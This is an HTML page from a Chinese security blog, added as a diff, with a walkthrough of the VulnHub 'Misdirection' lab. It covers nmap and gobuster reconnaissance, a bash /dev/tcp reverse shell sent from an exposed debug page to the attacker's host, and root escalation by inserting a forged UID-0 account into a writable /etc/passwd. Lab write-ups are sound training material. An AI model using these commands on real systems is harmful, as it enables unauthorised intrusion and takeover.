@@ -1,0 +1,744 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <link rel="icon" href="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/fy.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FYHypo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x01 端口扫描1、扫描C段主机发现12ip anmap -sn 192.168.203.0&#x2F;24   新出现的ip即为目标靶机注意：靶机要开nat模式   2、全端口以10000最低速率扫描1nmap --min-rate 100000 -p- 192.168.203.134   初步了解这台靶机：22端口ssh，80和8080开着web服务 (且大概率80是对外网页、8080是后台网页)，3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub misdirection">
+<meta property="og:url" content="https://fyhypo.github.io/blog/vulnhub/vulnhub%20misdirection/index.html">
+<meta property="og:site_name" content="FYHypo&#39;s blog">
+<meta property="og:description" content="0x01 端口扫描1、扫描C段主机发现12ip anmap -sn 192.168.203.0&#x2F;24   新出现的ip即为目标靶机注意：靶机要开nat模式   2、全端口以10000最低速率扫描1nmap --min-rate 100000 -p- 192.168.203.134   初步了解这台靶机：22端口ssh，80和8080开着web服务 (且大概率80是对外网页、8080是后台网页)，3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fyhypo.github.io/img/misdirection.jpg">
+<meta property="article:published_time" content="2024-08-31T14:11:34.594Z">
+<meta property="article:modified_time" content="2024-08-31T14:11:34.595Z">
+<meta property="article:author" content="FYHypo">
+<meta property="article:tag" content="pentest">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fyhypo.github.io/img/misdirection.jpg">
+  
+  
+  
+  <title>vulnhub misdirection - FYHypo&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fyhypo.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FYHypo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/none.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnhub misdirection"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-31 22:11" pubdate>
+          2024年8月31日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          736 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          7 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vulnhub misdirection</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><h4 id="1、扫描C段主机发现"><a href="#1、扫描C段主机发现" class="headerlink" title="1、扫描C段主机发现"></a>1、扫描C段主机发现</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip a<br>nmap -sn 192.168.203.0/24<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>新出现的ip即为目标靶机<br>注意：靶机要开nat模式</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/5208d82dd1c04ee1ab5767ac8602fc86.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e3cfc8dd36ab4d5f9857473baed56761.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h4 id="2、全端口以10000最低速率扫描"><a href="#2、全端口以10000最低速率扫描" class="headerlink" title="2、全端口以10000最低速率扫描"></a>2、全端口以10000最低速率扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --min-rate 100000 -p- 192.168.203.134<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/bd663271a5a2426cb5c3a107ef2f098b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>初步了解这台靶机：22端口ssh，80和8080开着web服务 (且大概率80是对外网页、8080是后台网页)，3306连着mysql数据库</p>
+</blockquote>
+<h4 id="3、初步tcp扫描探测详细信息"><a href="#3、初步tcp扫描探测详细信息" class="headerlink" title="3、初步tcp扫描探测详细信息"></a>3、初步tcp扫描探测详细信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p22,80,8080,3306 192.168.203.134<br></code></pre></td></tr></table></figure>
+
+<p>初步分析没有必要udp扫描，直接在tcp扫描同时进行漏洞扫描：</p>
+<h4 id="4、漏洞脚本扫描"><a href="#4、漏洞脚本扫描" class="headerlink" title="4、漏洞脚本扫描"></a>4、漏洞脚本扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script=vuln -p22,80,8080,3306 192.168.203.134<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2e57597dd4c04eddb31557cb013d92a2.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>apache，mysql，linux3.x<br>接着等待漏洞扫描结果</p>
+</blockquote>
+<p>等待有点久，决定先看看web网页：<br><img src="https://img-blog.csdnimg.cn/3fa2e7efd76c4086a0ce4f2ca38000e3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>80端口是个voting(投票)页面，再看看8080：<br><img src="https://img-blog.csdnimg.cn/4691e3e537e0448da7d6771fdc127585.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>是个莫名其妙的介绍页面，先去看看漏洞扫描结果：</p>
+<p><img src="https://img-blog.csdnimg.cn/c2ec37a9d4b54889a5e96236640115e4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>1、80的注册页面可能有sql注入<br>2、80可能有csrf（csrf优先级靠后，不急着试）<br>3、8080可以扫出很多东西，比如wordpress(开始考虑cms渗透)，还发现一个很感兴趣的debug</p>
+</blockquote>
+<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><h4 id="先跑起对80的sqlmap和目录扫描"><a href="#先跑起对80的sqlmap和目录扫描" class="headerlink" title="先跑起对80的sqlmap和目录扫描"></a>先跑起对80的sqlmap和目录扫描</h4><p>先拿medium扫一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.203.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/c29bffd2892a4326830ad4526ece068a.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>80不让扫，来都来了就先扫下8080，同时跑起sqlmap</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/64d75873222b4e0287b716b260f95c45.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>sqlmap没发现注入点，先放下这条路<br>对8080的扫描发现了两个令人感兴趣的东西：之前的debug和shell，访问一下看看：</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/d0838cc6c0e142459c09b4ca967d6c1c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>在debug页面发现直接给了shell，直接测试反弹shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.203.128/1234 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/071cbe47d1e648d59cca7e167eef376e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>拿到初步立足点，低权限的www-data用户</p>
+</blockquote>
+<h3 id="初步shell加固"><a href="#初步shell加固" class="headerlink" title="初步shell加固"></a>初步shell加固</h3><blockquote>
+<p>使shell可以使用清屏</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> TERM=xterm-color<br></code></pre></td></tr></table></figure>
+
+<h2 id="0x03-初步提权到其他用户"><a href="#0x03-初步提权到其他用户" class="headerlink" title="0x03 初步提权到其他用户"></a>0x03 初步提权到其他用户</h2><p>先尝试sudo提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/00a456ad396d4bcbb1ce356c4caf994f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>发现brexit用户可以不使用密码起bash</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u brexit /bin/bash<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/e088ec63c93149bb84e6258f56d30293.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>成功提权到了brexit用户<br><img src="https://img-blog.csdnimg.cn/6f1712edc7354201bd483b66a0adfd4f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h3 id="再次加固shell"><a href="#再次加固shell" class="headerlink" title="再次加固shell"></a>再次加固shell</h3><blockquote>
+<p>获取完整shell：<br>1、 <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>2、ctrl+z后台化shell<br>3、<code>stty raw -echo</code><br>4、输入<code>fg</code>+回车<br>此时shell就可以使用各种按键而不会乱码了，ctrl+c也不会断开<br><code>注意</code>：此过程需确保在监听端口前就使用着bash shell，而非默认的zsh shell</p>
+</blockquote>
+<h3 id="再次提权到root"><a href="#再次提权到root" class="headerlink" title="再次提权到root"></a>再次提权到root</h3><blockquote>
+<p>因为不知道brexit的密码，所以sudo提权走不通</p>
+</blockquote>
+<p><code>养成习惯</code>：提权到其他用户后首先查看属于他的文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/brexit<br><span class="hljs-built_in">ls</span> -liah<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/6cfdae2dae324513baab1083dd69d116.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>发现可以查看shell的历史记录的隐藏文件，但注意到是0字节，所以只能放弃<br>接着看到了.viminfo有东西，查看：</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/d390d19211984669a27068cf9535a775.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>发现brexit可以通过vi对&#x2F;etc&#x2F;passwd修改<br>那么就简单了，直接在&#x2F;etc&#x2F;passwd插入一个自己的root用户即可提权</p>
+</blockquote>
+<h4 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h4><p>生成密码的哈希：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl passwd -1 123456  <span class="hljs-comment">#-1是指使用md5</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/833b80779e51410bb767fc2e264d8e1e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>查看下root用户的存储格式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd | grep root<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/8ad23255d4fc415db4f6f535314012e9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<blockquote>
+<p>伪造一个root用户ys：<br>ys:$1$DYxaAHua$oJbruttN2RHg5PTWuJK3S0:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/a2023f0e966e4179b41a24b6260476b6.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>登录su用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su ys<br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/5d694e0b8856424395c41f2096ae7563.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>成功root<br><img src="https://img-blog.csdnimg.cn/7bb77697c2ca48b29af4221f43a8502c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pentest/" class="print-no-link">#pentest</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnhub misdirection</div>
+      <div>https://fyhypo.github.io/blog/vulnhub/vulnhub misdirection/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>FYHypo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/blog/vulnhub/vulnhub%20Kiotrix3/" title="vulnhub Kiotrix3">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vulnhub Kiotrix3</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blog/vulnhub/vulnhub%20pWnOS1.o/" title="vulnhub pWnOS1.0">
+                        <span class="hidden-mobile">vulnhub pWnOS1.0</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>FYHypo</span></a> <i class="iconfont icon-love"></i> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/custom.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
